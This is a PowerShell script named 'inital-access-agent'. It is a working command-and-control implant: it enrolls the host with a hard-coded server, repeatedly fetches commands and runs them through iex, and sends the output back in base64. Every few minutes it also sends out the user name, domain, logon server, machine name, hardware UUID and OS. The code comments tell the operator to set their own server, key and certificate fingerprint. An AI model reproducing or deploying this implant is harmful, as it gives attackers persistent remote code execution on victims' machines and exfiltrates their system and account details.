# inital-access-agent
function main {

	$uri = 'https://192.168.1.218/' # Set ip address or domain hosting the null-shell cgi app.
	$key = 'ZkdkNWYwZjdqZUwtRlRsX3lhUi1PVVY2R3IxZlFW' # set the key that matches the one set on the cgi handler inside single quotes
	$certfingerprint = 'C6F8F7C3D8A0924A5643415CC9134D0004473F04' # place your ssl key fingerprint here to perform manual key validation
	$agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"  # user-agent variable
	
	function hreq($request)
	{
		# This turns off https cert checking in order to work with Self Signed Certificates. 
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
		$webclient = New-Object System.Net.WebClient
		$webclient.headers.add("User-Agent", $agent)
		$encstring = $webclient.Downloadstring($request)
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }
		$string = b64str-dec $encstring
		return $string
	}

	function crtchk($urlTocheck)
	{
		# This turns off https cert checking in order to work with Self Signed Certificates.
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
		$millisecs = 5000
		$req = [Net.HttpWebRequest]::Create($urlTocheck)
		$req.UserAgent = $agent
		$req.Timeout = $millisecs
		$response = $req.GetResponse()
		$response.close() # pipe getresponse response to close connection prevents lock ups
		$keyfingerprint = $req.ServicePoint.Certificate.GetCertHashString()
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }
		return $keyfingerprint
	}

	function webreq($request)
	{
		$keyprint = crtchk $uri
		if ( "$keyprint" -eq "$certfingerprint" )  { $cmdString = hreq $request } else { throw "CERT PRINT MISMATCH!" }
		# Uncomment the below to debug; # write-host server thumbprint [ $keyprint ] ;# write-host client thumbprint [ $certfingerprint ]
		return $cmdString
	}

	# Making base 64 url safe
	function b64url-enc($rawstr) 
	{
		$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($rawstr))
		$rmequal = $encstring -replace '=', '!'
		$rmslash = $rmequal -replace '/', '_'
		$rmplus  = $rmslash -replace '\+', '-'
		$encurl = $rmplus
		return $encurl
	}
	
	# Do not use this for encoded commands since UTF8
	function b64str-enc($str) 
	{
		$b64str = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($str))
		return $b64str
	}
	function b64str-dec($b64str) 
	{
		$str = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($b64str))
		return $str
	}

	function get-sysname 
	{
		#[->] register machine to server
		$rawmac = ((gwmi win32_networkadapter -Filter "AdapterType LIKE 'Ethernet 802.3'") | select -expand macaddress )
		$mac = $rawmac -replace "\W", '-'
		$name = $env:computername
		$uniqueID = gwmi win32_computersystemproduct | select -expand uuid
		$sysname = $name + "::" + $uniqueID
		return $sysname
	}
	
	function time-stamp
	{
		$ti = get-date -format hh:mm:ss.ffff
		$stmp = '[response sent] ' + $ti + "`n"
		
		return $stmp		
	}
	
	function get-info 
	{
		$domain = $env:UserDomain
		$LogOnServer = $env:LogOnServer
		$userName = $env:UserName
		$machineName = $env:ComputerName
		$rawmac = ((gwmi win32_networkadapter -Filter "AdapterType LIKE 'Ethernet 802.3'") | select -expand macaddress )
		$mac = $rawmac -replace "\W", '-'
		$biosversion = gwmi win32_bios | select -expand SMBIOSBIOSVersion
		$serial = gwmi win32_bios | select -expand SerialNumber
		$uniqueID = gwmi win32_computersystemproduct | select -expand uuid
		$updateTime = get-date -uformat "%H:%M:%S_%m-%d-%y"
		$OS = (gwmi Win32_OperatingSystem).caption
		$SysDescription = (gwmi Win32_OperatingSystem).description
		$PsVersion = $PSVersionTable.PSVersion.Major
		$telemetry = "$updateTime|$domain|$userName|$LogOnServer|$machineName|$uniqueID|$OS"
		write-output $telemetry
	}

	function core
	{
		$hostname = get-sysname
		$enchostname = b64url-enc $hostname
		$enckey = b64url-enc $key
		$enroll = $uri + "?auth=" + $enckey + "&reg=" + $enchostname
		$bucket = webreq $enroll

		while (1)
		{
			try
			{
				$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
				$cmd = webreq $getcmd
		
				if ($cmd -match 'runcode')
				{   
					$sendback = (iex "$cmd" 2>&1 | Out-String )
					$tstamp = time-stamp
					$summary = $tstamp + $sendback 
					$encstdout = b64url-enc $summary
					
					if ( $encstdout.length -gt 65000 ) { $encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length)) }
					$upload = $uri + "?auth=" + $enckey + "&rsp=" + $encstdout + "&host=" + $enchostname
					$bucket = webreq $upload
					Start-Sleep -s 10
				}
				else
				{	
					$cmd = "get-info"
					$sendback = (iex "$cmd" 2>&1 | Out-String )
					$encstdout = b64url-enc $sendback
					
					if ( $encstdout.length -gt 65000 ) { $encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length)) }
					$update = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
					$bucket = webreq $update
					Start-Sleep -s 180
				}
			}
			catch
			{
				#[->] uncomment warnings below for debugging
        $er = $_.Exception.Message
				if ( $er -match 'CERT CHECK FAILED!' ) { exit } else { $stmp = time-stamp; $ermsg = $stmp + ' COMMAND FAILED!!! Waiting for 60 seconds before checking back in.' }
				$senderror = $ermsg
				$encstdout = b64url-enc $senderror
				$snderr = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
				$bucket = webreq $snderr
				Start-Sleep -s 500
			}
			
		}
	}
	
	while (1) { try { core } catch { Start-Sleep -s 1000 } }
} main
